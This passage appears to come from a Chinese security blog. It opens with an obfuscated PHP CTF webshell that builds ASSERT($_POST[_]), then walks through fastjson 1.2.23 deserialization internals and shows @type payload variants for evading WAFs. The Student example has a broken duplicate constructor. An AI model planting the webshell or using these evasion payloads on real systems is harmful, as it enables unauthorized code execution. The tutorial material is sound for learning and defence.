<h2 id="收录一下其他人的脚本"><a href="#收录一下其他人的脚本" class="headerlink" title="收录一下其他人的脚本"></a>收录一下其他人的脚本</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson初学</title>
    <url>/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写这篇文章就是来简单理解一下他反序列化的原理，内核实现<br><span id="more"></span><br>在调试fastjson的时候可能会遇到Source code does not match the bytecode的情况（IJ），我的解决方案是下载源码去阅读</p>
<h2 id="fastjson基本用法"><a href="#fastjson基本用法" class="headerlink" title="fastjson基本用法"></a>fastjson基本用法</h2><p>文章的fastjson版本<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><br>fastjson主要是用来序列化与反序列化JavaBean<br>下面是一个简单的JavaBean对象<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student无参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>下面将用fastjson来序列化上面的对象，将他们转换为json<br>新建一个文件StudentSer.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serJson</span> <span class="operator">=</span> JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;kaikaix&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        System.out.println(serJson);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/1.jpg" alt><br>打印了getAge和getName，说明在序列化的时候会对getXxxx进行调用<br>当然不止toJSONString，还有toJSONBytes，具体可以看JSON.class类中的成员方法</p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>接下来就是反序列化了，这里的反序列化类似php，并不是读取字节文件，而是读取json格式的字符串<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serJson</span> <span class="operator">=</span> JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;kaikaix&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        System.out.println(serJson);</span><br><span class="line">        System.out.printf(<span class="string">&quot;Parse had done =&gt; %s\n&quot;</span>,JSON.parse(serJson).getClass());</span><br><span class="line">        System.out.printf(<span class="string">&quot;parseObject has done =&gt; %s\n&quot;</span>,JSON.parseObject(serJson).getClass());</span><br><span class="line">        System.out.printf(<span class="string">&quot;parseObject(Student.class) has done =&gt; %s\n&quot;</span>,JSON.parseObject(serJson,Student.class).getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/2.jpg" alt><br>在这里进行了三次反序列化<br>主要就是parse和parseObject<br>但是观察parseObject的源码，其实也是对parse的一次封装，核心还是调用了parse，主要区别就是对parse后返回的obj调用了一次toJSON，调用toJSON就会调用类中所有get，set方法<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们注意到，只有最后一次反序列化的时候调用了setXxx方法，因为最后一次传递了一个Student.class给他，fastjson才能知道这段String最后到底应该反序列化为哪个对象<br>而且反序列化的时候调用的构造函数是无参构造器，所以fastjson反序列化的JavaBean必须有无参构造器，否则就会报错</p>
<blockquote>
<p><strong>@type</strong><br>如果每次都需要传递具体是哪个类的，就会显得这个反序列化很笨重，所以开发者给定了一个@type的键，可以在json字符串里面指定具体要反序列化为哪个对象<br><code>serJson = &quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;&#125;&quot;;</code><br>如果是将这样的json字符串进行反序列化，那么上面的三种反序列化方式也都可以正确反序列化<br>所以这个点也是后续漏洞的核心关键</p>
</blockquote>
<h2 id="反序列化源码分析"><a href="#反序列化源码分析" class="headerlink" title="反序列化源码分析"></a>反序列化源码分析</h2><p><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/3.jpg" alt></p>
<h3 id="No1-DefaultJSONParser"><a href="#No1-DefaultJSONParser" class="headerlink" title="No1 DefaultJSONParser"></a>No1 DefaultJSONParser</h3><p>首先会进入这里，new了一个DefaultJSONParser对象<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/4.jpg" alt><br>跟进去会首先判断第一个字符是什么，如果是“{”，就会将token设置为12，如果是“[”，就会设置14，如果都不是就会进入nextToken，主要作用就是看下一个字符是什么，如果碰到了“{”就将token设置为12<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//部分代码</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">    <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="built_in">this</span>.token = <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><br>当然还有其它情况，比如碰到空格之类的，就会继续跳到下一个字符，直到碰到像“{”这样的字符，有时绕waf可能就会用到这些特性，比如在json前面填充垃圾字符<br><code>serJson = &quot;        &#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;&#125;&quot;;</code><br>剩下的读者可以自行分析</p>
<blockquote>
<p><strong>小插曲</strong><br>这里我将{}改成了[]，然后进行了反序列化<br><code>serJson = &quot;[\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;]&quot;;</code><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/5.jpg" alt><br>但是报错了，继续fuzz，试了一下{开头，]结尾<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/6.jpg" alt><br>虽然最后报错了，但是前面确实可以反序列化，说不定这种就可以绕一下waf</p>
</blockquote>
<p><em>注意上面的操作都是在json字符串之前的，也就是在“{”前面的一些检查，接下来就进入{}里面了</em></p>
<h3 id="No2-parseObject-gt-skipWhitespace"><a href="#No2-parseObject-gt-skipWhitespace" class="headerlink" title="No2 parseObject()-&gt;skipWhitespace()"></a>No2 parseObject()-&gt;skipWhitespace()</h3><p>走完DefaultJSONParser的初始化，就进入到parser.parse()<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/7.jpg" alt><br>因为之前是{，所以设置的token为12，所以就会进入这个case<br>由于字节的原因，我不能在这下断点，所以我直接将断点打到parseObject里面<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/8.jpg" alt><br>直接跳到这个循环处<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/9.jpg" alt><br>第一个函数根据英文意思skipWhitespace，可以大概猜出是跳过空白字符串<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">skipWhitespace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27; &#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\r&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\n&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\t&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\f&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.skipComment();</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到具体实现，不仅可以跳过空格，换行之类的，还可以跳过注释（skipComment）<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">skipComment</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(<span class="built_in">this</span>.ch != <span class="number">26</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.next();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;invalid comment&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="built_in">this</span>.ch != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>那么就是/*xxxx*/<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123; <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="comment">/**/&quot;<span class="doctag">@type</span>&quot;:&quot;Student&quot;&#125;</span></span><br><span class="line"><span class="comment">&#123;/*abcdef*/</span><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br></pre></td></tr></table></figure><br>那么这四种其实效果相同，都可以达到反序列化的目的</p>
<h3 id="No3-parseObject-gt-AllowArbitraryCommas"><a href="#No3-parseObject-gt-AllowArbitraryCommas" class="headerlink" title="No3 parseObject()-&gt;AllowArbitraryCommas"></a>No3 parseObject()-&gt;AllowArbitraryCommas</h3><p>在走完上面的判断以后，接下来就是<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/10.jpg" alt><br>同样，根据字面意思和代码，大概推断就是判断有没有逗号，如果有就跳过<br>也就是<code>&#123;,,,,&quot;@type&quot;:&quot;Student&quot;&#125;</code>，也是可以进行正常反序列化的</p>
<h3 id="No4-parseObject-gt-scanSymbol"><a href="#No4-parseObject-gt-scanSymbol" class="headerlink" title="No4 parseObject()-&gt;scanSymbol()"></a>No4 parseObject()-&gt;scanSymbol()</h3><p>继续往下走<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/11.jpg" alt><br>因为走完前面的一系列操作，那么当前的字符就是@type之前的双引号了<br>这里的scanSymbol很重要，主要就是扫描到下一个双引号出现之前的字符串，在这就是@type<br>其中有几段比较重要的特性，我这截取了部分代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (chLocal == <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">    chLocal = <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="keyword">switch</span>(chLocal) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c4</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> Integer.parseInt(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">char</span>[]&#123;c1, c2, c3, c4&#125;), <span class="number">16</span>);</span><br><span class="line">            hash = <span class="number">31</span> * hash + val;</span><br><span class="line">            <span class="built_in">this</span>.putChar((<span class="type">char</span>)val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            <span class="type">char</span> <span class="variable">x1</span> <span class="operator">=</span> <span class="built_in">this</span>.ch = <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">x2</span> <span class="operator">=</span> <span class="built_in">this</span>.ch = <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">x_val</span> <span class="operator">=</span> digits[x1] * <span class="number">16</span> + digits[x2];</span><br><span class="line">            <span class="type">char</span> <span class="variable">x_char</span> <span class="operator">=</span> (<span class="type">char</span>)x_val;</span><br><span class="line">            hash = <span class="number">31</span> * hash + x_char;</span><br><span class="line">            <span class="built_in">this</span>.putChar(x_char);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>什么意思呢，就是当遇见斜杠，那么就看斜杠后面第一个字母是什么<br>如果是u那就读取u后面4位，当作unicode解码<br>同理如果是x就当作十六进制解码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\u0040\u0074\u0079pe&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\x40\x74\x79\x70\x65&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\x40\x74\x79pe&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br></pre></td></tr></table></figure><br>这上面5个json是等价的，都可以正常进行反序列化</p>
<h3 id="No5-parseObject-gt-TypeUtils-loadClass"><a href="#No5-parseObject-gt-TypeUtils-loadClass" class="headerlink" title="No5 parseObject()-&gt;TypeUtils.loadClass()"></a>No5 parseObject()-&gt;TypeUtils.loadClass()</h3><p>提取完了@type这个键的字符串以后，就要解析键值了，在这里就是Student<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/12.jpg" alt><br>可以看到同样用到了scanSymbol，也就是说我们的类名也可以用十六进制和unicode去编码<br><code>&#123;&quot;\x40\x74\x79pe&quot;:&quot;\u0053\u0074\u0075dent&quot;&#125;</code><br>接着就进入到了loadClass了，动态加载类<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/13.jpg" alt><br>首先会在mappings中去找是否存在这些类，如果不存在就跳到<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = classLoader.loadClass(className);</span><br><span class="line">    mappings.put(className, clazz);</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>去动态加载类，并且将类和类名添加到mappings中，然后返回此类，这里的mappings其实是一个缓存，一般是java的原生类，关于动态加载类到底知识可以自己百度搜索一下，这里不细说</p>
<blockquote>
<p>小插曲<br>这里我注意到了中间两个if语句<br>第一个：如果第一个字符是“[”，那么就将他去掉，在进行loadClass<br>第二个：如果第一个字符是“L”,且结尾是“;”，那么也是去掉以后调用loadClass<br>这里我fuzz了一下<br><code>&#123;&quot;@type&quot;:&quot;[Student&quot;&#125;</code><br>中括号加在最前面会报错，不知道为什么，但是根据他的报错信息，我最后整理了一个新的可以利用的，在下一篇我会说一下我是如何找出这样的payload的<code>&#123;&quot;@type&quot;:&quot;[Student&quot;[&#123;,&quot;age&quot;:12,&quot;name&quot;:&quot;kaikaix&quot;&#125;</code><br><code>&#123;&quot;@type&quot;:&quot;LStudent;&quot;&#125;</code><br><code>&#123;&quot;@type&quot;:&quot;LLStudent;;&quot;&#125;</code><br>这样就不会报错，可以继续接下来的操作，调用无参构造和set方法</p>
</blockquote>
<h3 id="No6-parseObject-gt-getDeserializer"><a href="#No6-parseObject-gt-getDeserializer" class="headerlink" title="No6 parseObject()-&gt;getDeserializer()"></a>No6 parseObject()-&gt;getDeserializer()</h3><p>接下来到了<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/14.jpg" alt><br>我们进入到getDeserializer中，中间会到了一个denyList的一个循环<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/15.jpg" alt><br>这里前面的replace是将“$”替换为“.”</p>
<blockquote>
<p>如果A类中有个内部类B<br>在编译的时候会生成A.class和A$B.class</p>
</blockquote>
<p>那么这一段代码就是用来检查你的类名是否在黑名单中，但是在这个版本的fastjson，黑名单只有两个Thread类</p>
